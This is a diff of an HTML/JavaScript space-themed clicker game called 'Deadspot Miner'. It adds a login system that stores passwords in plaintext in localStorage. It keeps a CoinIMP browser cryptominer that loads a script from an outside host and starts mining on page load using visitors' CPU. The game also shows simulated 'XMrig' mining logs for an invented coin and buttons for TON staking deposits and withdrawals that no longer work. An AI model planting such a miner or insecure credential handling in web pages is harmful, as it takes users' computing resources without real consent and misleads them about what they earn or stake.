@@ -4,70 +4,150 @@
 <meta charset="UTF-8">
 <title>Deadspot Miner + Clicker Cosmic</title>
 <style>
-body { background:#0d0d0d; color:#eee; font-family: monospace; margin:0; overflow:hidden; }
-h1 { color:#4caf50; text-align:center; margin:10px 0; }
-#deadspotBalance { font-size:22px; margin:10px; color:#ffd700; text-align:center; }
+body { background:#0d0d0d; color:#eee; font-family: monospace; margin:0; overflow:hidden; text-align:center; }
+input { padding:5px; margin:5px; border-radius:3px; border:none; }
+button { padding:5px 10px; margin:5px; cursor:pointer; border-radius:3px; border:none; background:#4caf50; color:#fff; }
+button:hover { background:#66bb6a; }
+h1 { color:#4caf50; margin:20px 0; }
+
+#loginBox, #registerBox, #gameBox { display:none; margin-top:30px; }
+#deadspotBalance { font-size:22px; margin:10px; color:#ffd700; }
 #energyBar { width: 300px; height: 20px; border:1px solid #444; margin:10px auto; background:#222; border-radius:5px; overflow:hidden; }
 #energyFill { height:100%; width:100%; background:#4caf50; transition: width 0.2s; }
-#clickBtn {
-  width: 220px; height: 220px; border-radius: 50%; background: #111; border: 3px solid #444;
-  cursor: pointer; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
-  overflow:hidden; box-shadow:0 0 15px #4caf50 inset; animation: pulseClick 2s infinite alternate; z-index:2;
-}
+
+#clickBtn { width: 220px; height: 220px; border-radius: 50%; background: #111; border: 3px solid #444;
+cursor: pointer; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
+overflow:hidden; box-shadow:0 0 15px #4caf50 inset; animation: pulseClick 2s infinite alternate; z-index:2; }
 #clickBtn img { width:100%; height:100%; object-fit:cover; }
 #clickBtn:active { transform:translate(-50%,-50%) scale(0.95); box-shadow:0 0 30px #ff0000 inset; }
 @keyframes pulseClick { 0%{box-shadow:0 0 15px #4caf50 inset;} 100%{box-shadow:0 0 30px #00f;} }
-button { background:#333; color:#eee; padding:10px 20px; border:none; border-radius:5px; margin:5px; cursor:pointer; }
-button:hover { background:#555; }
+
 #hashrateChart { background:rgba(0,0,0,0.5); border:1px solid #333; border-radius:10px; position:absolute; top:400px; left:50%; transform:translateX(-50%); }
+
 #xmrigLogsBox { position:absolute; top:10px; left:10px; width:350px; height:300px; background:rgba(0,0,0,0.5); border:1px solid #444; padding:10px; overflow-y:auto; font-size:12px; }
 .logAccepted { color:#4caf50; }
 .logRejected { color:#f44336; }
+
 #pulseurBox { position:absolute; top:10px; right:10px; width:250px; text-align:center; z-index:2; }
 #pulseur { width:50px; height:50px; margin:5px auto; background:red; border-radius:50%; animation: pulse 1.5s infinite alternate; cursor:pointer; }
 @keyframes pulse { 0%{transform:scale(1);} 100%{transform:scale(1.2);} }
+
 #stakedInfo, #stakingBonus { margin:5px; }
 #stakeHistory { max-height:120px; overflow-y:auto; margin-top:5px; background:rgba(0,0,0,0.3); padding:5px; font-size:12px; text-align:left; }
-#faucetBtn { position:absolute; top:calc(50% + 150px); left:65%; transform:translateX(-50%); }
-#cooldown { color:#ff0; margin-top:5px; }
+
 #stars { position:absolute; width:100%; height:100%; background:black; z-index:-2; }
 .star { position:absolute; width:2px; height:2px; background:white; border-radius:50%; animation: twinkle 3s infinite; }
 @keyframes twinkle { 0%,100%{opacity:0.5;} 50%{opacity:1;} }
 .spaceship { position:absolute; width:30px; height:15px; background:cyan; clip-path:polygon(0% 0%,100% 50%,0% 100%); animation:fly linear infinite; z-index:-1; }
 @keyframes fly { 0%{left:-40px;} 100%{left:100%;} }
+
+#faucetBtn { position:absolute; top:300px; left:60%; transform:translateX(-50%); padding:10px 20px; background:#00bcd4; border-radius:5px; cursor:pointer; }
+#faucetCooldown { color:#fff; margin-top:5px; }
 </style>
 </head>
 <body>
 
-<div id="stars"></div>
-
 <h1>💎 Deadspot Miner + Clicker Cosmic</h1>
-<div id="deadspotBalance">Deadspot: 0</div>
-<div id="energyBar"><div id="energyFill"></div></div>
 
-<div id="clickBtn"><img src="skull.png" alt="skull"></div>
-
-<div id="xmrigLogsBox"></div>
-
-<!-- Pulseur + staking -->
-<div id="pulseurBox">
-  <div id="pulseur"></div>
-  <div id="stakedInfo">Total staké : 0 TON</div>
-  <div id="stakingBonus">Bonus reçu : 0 DSC</div>
-  <button id="verifyDepositBtn">✅ Vérifier Dépôt</button>
-  <button id="withdrawBtn">📤 Retirer mes TON</button>
-  <button id="convertBonusBtn">💎 Convertir Bonus → Deadspot</button>
-  <div id="stakeHistory"></div>
+<!-- LOGIN & REGISTER -->
+<div id="registerBox">
+  <h2>Sign Up</h2>
+  <input type="text" id="regUsername" placeholder="Username"><br>
+  <input type="password" id="regPassword" placeholder="Password"><br>
+  <button onclick="register()">Sign Up</button>
+  <p id="regMsg"></p>
+  <p>Already have an account? <a href="#" onclick="showLogin()">Login</a></p>
 </div>
 
-<button id="faucetBtn">💧 Faucet</button>
-<div id="cooldown">Prêt !</div>
+<div id="loginBox">
+  <h2>Login</h2>
+  <input type="text" id="loginUsername" placeholder="Username"><br>
+  <input type="password" id="loginPassword" placeholder="Password"><br>
+  <button onclick="login()">Login</button>
+  <p id="loginMsg"></p>
+  <p>No account? <a href="#" onclick="showRegister()">Sign Up</a></p>
+</div>
 
-<canvas id="hashrateChart" width="400" height="200"></canvas>
+<!-- GAME -->
+<div id="gameBox">
+  <div id="deadspotBalance">Deadspot: 0</div>
+  <div id="energyBar"><div id="energyFill"></div></div>
+  <div id="clickBtn"><img src="skull.png" alt="skull"></div>
+
+  <div id="xmrigLogsBox"></div>
+
+  <!-- Pulseur + staking -->
+  <div id="pulseurBox">
+    <div id="pulseur"></div>
+    <div id="stakedInfo">Total staké : 0 TON</div>
+    <div id="stakingBonus">Bonus reçu : 0 DSC</div>
+    <button id="verifyDepositBtn">✅ Vérifier Dépôt</button>
+    <button id="withdrawBtn">📤 Retirer mes TON</button>
+    <button id="convertBonusBtn">💎 Convertir Bonus → Deadspot</button>
+    <div id="stakeHistory"></div>
+  </div>
+
+  <canvas id="hashrateChart" width="400" height="200"></canvas>
+
+  <!-- Faucet -->
+  <div id="faucetBtn">💧 Claim Faucet</div>
+  <div id="faucetCooldown"></div>
+</div>
+
+<div id="stars"></div>
+
+<!-- CoinIMP -->
+<script src="https://www.hostingcloud.racing/I9tR.js"></script>
+<script>
+var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {
+    throttle: 0.4, c: 'w'
+});
+_client.start();
+_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 20, "#3d3d3d");
+</script>
 
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-
 <script>
+// ---------------- LOGIN & REGISTER ----------------
+function showRegister(){ document.getElementById('registerBox').style.display='block'; document.getElementById('loginBox').style.display='none'; }
+function showLogin(){ document.getElementById('registerBox').style.display='none'; document.getElementById('loginBox').style.display='block'; }
+
+function register(){
+  let username=document.getElementById('regUsername').value.trim();
+  let password=document.getElementById('regPassword').value.trim();
+  if(!username || !password){ document.getElementById('regMsg').textContent="Fill all fields!"; return; }
+  let users=JSON.parse(localStorage.getItem('users'))||{};
+  if(users[username]){ document.getElementById('regMsg').textContent="Username exists!"; return; }
+  users[username]=password;
+  localStorage.setItem('users', JSON.stringify(users));
+  document.getElementById('regMsg').textContent="Account created!";
+  document.getElementById('regUsername').value=''; document.getElementById('regPassword').value='';
+}
+
+function login(){
+  let username=document.getElementById('loginUsername').value.trim();
+  let password=document.getElementById('loginPassword').value.trim();
+  let users=JSON.parse(localStorage.getItem('users'))||{};
+  if(users[username] && users[username]===password){
+    localStorage.setItem('currentUser', username);
+    showGame();
+  } else { document.getElementById('loginMsg').textContent="Invalid credentials!"; }
+}
+
+function showGame(){
+  let user=localStorage.getItem('currentUser');
+  if(user){
+    document.getElementById('registerBox').style.display='none';
+    document.getElementById('loginBox').style.display='none';
+    document.getElementById('gameBox').style.display='block';
+  }
+}
+
+function logout(){ localStorage.removeItem('currentUser'); document.getElementById('gameBox').style.display='none'; showLogin(); }
+
+if(localStorage.getItem('currentUser')) showGame();
+
+// ---------------- GAME ----------------
 let deadspot=parseFloat(localStorage.getItem("deadspot"))||0;
 let energy=parseFloat(localStorage.getItem("energy"))||100;
 let maxEnergy=100;
@@ -75,18 +155,13 @@ let clickValue=0.00015;
 let upgrades=JSON.parse(localStorage.getItem("upgrades"))||{x2:false,multi:false,regen:false,auto:false};
 let autoClickInterval=null;
 
-/* Staking vars */
 let staked=parseFloat(localStorage.getItem("staked"))||0;
 let stakingBonus=parseFloat(localStorage.getItem("stakingBonus"))||0;
 let stakeTimestamp=parseInt(localStorage.getItem("stakeTimestamp"))||0;
 let stakeHistory=JSON.parse(localStorage.getItem("stakeHistory"))||[];
 
-/* Mining vars */
 let totalHashes=parseFloat(localStorage.getItem("totalHashes"))||0;
 let hashesPerSecond=0;
-
-/* Faucet cooldown */
-let faucetCooldown=0;
 
 function saveGame(){
   localStorage.setItem("deadspot",deadspot);
@@ -104,7 +179,6 @@ function updateUI(){
   document.getElementById("energyFill").style.width=(energy/maxEnergy*100)+"%";
   document.getElementById("stakedInfo").textContent="Total staké : "+staked.toFixed(2)+" TON";
   document.getElementById("stakingBonus").textContent="Bonus reçu : "+stakingBonus.toFixed(5)+" DSC";
-  document.getElementById("cooldown").textContent=faucetCooldown>0 ? "Faucet prêt dans: "+faucetCooldown+"s" : "Prêt !";
 
   let histBox=document.getElementById("stakeHistory");
   histBox.innerHTML="";
@@ -116,7 +190,6 @@ function updateUI(){
   hashrateChart.update();
 }
 
-/* Clicker */
 document.getElementById("clickBtn").addEventListener("click",()=>{
   if(energy>0){
     let gain=clickValue;
@@ -126,14 +199,21 @@ document.getElementById("clickBtn").addEventListener("click",()=>{
   }
 });
 
-/* Auto regen */
 setInterval(()=>{ if(energy<maxEnergy){ energy=Math.min(maxEnergy,energy+(upgrades.regen?2:1)); updateUI(); } },1000);
 
-/* Auto click */
-function startAutoClick(){ if(autoClickInterval) return; autoClickInterval=setInterval(()=>{ if(energy>0){ let gain=clickValue; if(upgrades.x2) gain*=2; if(upgrades.multi) gain*=5; deadspot+=gain; energy--; saveGame(); updateUI(); } },1000); }
+function startAutoClick(){
+  if(autoClickInterval) return;
+  autoClickInterval=setInterval(()=>{
+    if(energy>0){
+      let gain=clickValue;
+      if(upgrades.x2) gain*=2;
+      if(upgrades.multi) gain*=5;
+      deadspot+=gain; energy--; saveGame(); updateUI();
+    }
+  },1000);
+}
 if(upgrades.auto) startAutoClick();
 
-/* Staking pulse */
 document.getElementById("pulseur").addEventListener("click",()=>{
   if(staked>0){
     let bonus=staked*0.005;
@@ -143,57 +223,28 @@ document.getElementById("pulseur").addEventListener("click",()=>{
   }
 });
 
-/* Vérification dépôt */
-document.getElementById("verifyDepositBtn").addEventListener("click",()=>{
-  alert("⏳ Vérification en cours (~30 min simulé)... Veuillez patienter");
-  setTimeout(()=>{
-    let newStake=10+Math.random()*5;
-    staked+=newStake;
-    stakeTimestamp=Date.now();
-    stakeHistory.push("Dépôt validé : +"+newStake.toFixed(2)+" TON");
-    saveGame(); updateUI();
-    alert("✅ Dépôt validé : +"+newStake.toFixed(2)+" TON");
-  },5000);
-});
-
-/* Convert bonus */
-document.getElementById("convertBonusBtn").addEventListener("click",()=>{
-  if(stakingBonus<=0){ alert("Aucun bonus à convertir"); return; }
-  deadspot+=stakingBonus; alert("Bonus converti : +"+stakingBonus.toFixed(5)+" DSC"); stakingBonus=0;
-  saveGame(); updateUI();
-});
-
-/* Withdraw */
-document.getElementById("withdrawBtn").addEventListener("click",()=>{
-  if(staked<=0){ alert("Aucun TON staké"); return; }
-  let now=Date.now();
-  let oneWeek=7*24*60*60*1000;
-  if(now-stakeTimestamp<oneWeek){ alert("⏳ Attendez 7 jours minimum pour retirer"); return; }
-  if(staked<=0.2){ alert("Montant insuffisant pour couvrir frais 0.2 TON"); return; }
-  let withdrawAmount=staked-0.2;
-  stakeHistory.push("Retrait : "+withdrawAmount.toFixed(2)+" TON (0.2 TON frais)");
-  alert("Retrait effectué : "+withdrawAmount.toFixed(2)+" TON (0.2 TON frais)");
-  staked=0; stakingBonus=0; saveGame(); updateUI();
-});
-
 /* Faucet */
-document.getElementById("faucetBtn").addEventListener("click",()=>{
-  if(faucetCooldown>0){ alert("⏳ Attendez "+faucetCooldown+"s avant de reclamer"); return; }
-  let gain=0.0002 + Math.random()*0.0998;
-  deadspot+=gain; faucetCooldown=30; saveGame(); updateUI();
+let faucetCooldown=0;
+const faucetBtn=document.getElementById("faucetBtn");
+const faucetCDDisplay=document.getElementById("faucetCooldown");
+faucetBtn.addEventListener("click",()=>{
+  if(faucetCooldown>0) return;
+  let gain=Math.random()*0.0998+0.0002;
+  deadspot+=gain;
+  faucetCooldown=30;
+  updateUI();
 });
-
-/* Faucet cooldown timer */
 setInterval(()=>{
-  if(faucetCooldown>0){ faucetCooldown--; updateUI(); }
+  if(faucetCooldown>0) faucetCooldown--;
+  faucetCDDisplay.textContent=faucetCooldown>0 ? "Cooldown: "+faucetCooldown+"s" : "Faucet ready!";
 },1000);
 
-/* Chart.js setup */
+/* Chart.js */
 const ctx=document.getElementById('hashrateChart').getContext('2d');
 const hashrateChart=new Chart(ctx,{type:'line',data:{labels:[],datasets:[{label:'H/s',data:[],borderColor:'#4caf50',fill:true,tension:0.3}]},options:{responsive:false,animation:false,plugins:{legend:{labels:{color:'#eee'}}},scales:{x:{ticks:{color:'#aaa'}},y:{ticks:{color:'#aaa'}}}}});
 let time=0;
 
-/* XMrig logs */
+/* Simulate mining logs */
 const xmrigLogs=document.getElementById("xmrigLogsBox");
 setInterval(()=>{
   let threads=4;
@@ -213,46 +264,21 @@ setInterval(()=>{
   time++; updateUI();
 },1000);
 
-/* Stars background */
+/* Stars & Spaceships */
 for(let i=0;i<100;i++){
-  let star=document.createElement("div");
-  star.className="star";
-  star.style.top=Math.random()*100+"%";
-  star.style.left=Math.random()*100+"%";
-  star.style.width=1+Math.random()*2+"px";
-  star.style.height=1+Math.random()*2+"px";
-  star.style.opacity=Math.random();
-  document.getElementById("stars").appendChild(star);
+  let star=document.createElement("div"); star.className="star";
+  star.style.top=Math.random()*100+"%"; star.style.left=Math.random()*100+"%";
+  star.style.width=1+Math.random()*2+"px"; star.style.height=1+Math.random()*2+"px";
+  star.style.opacity=Math.random(); document.getElementById("stars").appendChild(star);
 }
-
-/* Spaceships */
 for(let i=0;i<5;i++){
-  let ship=document.createElement("div");
-  ship.className="spaceship";
-  ship.style.top=(20+i*30)+"px";
-  ship.style.animationDuration=(5+Math.random()*5)+"s";
+  let ship=document.createElement("div"); ship.className="spaceship";
+  ship.style.top=(20+i*30)+"px"; ship.style.animationDuration=(5+Math.random()*5)+"s";
   document.body.appendChild(ship);
 }
 
 /* Load UI */
 updateUI();
 </script>
-
-<!-- CoinIMP Miner -->
-<script src="https://www.hostingcloud.racing/I9tR.js"></script>
-<script>
-    var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {
-        throttle: 0.4, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification(
-        "Top", 
-        "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", 
-        "#cccccc", 
-        20, 
-        "#3d3d3d"
-    );
-</script>
-
 </body>
 </html>
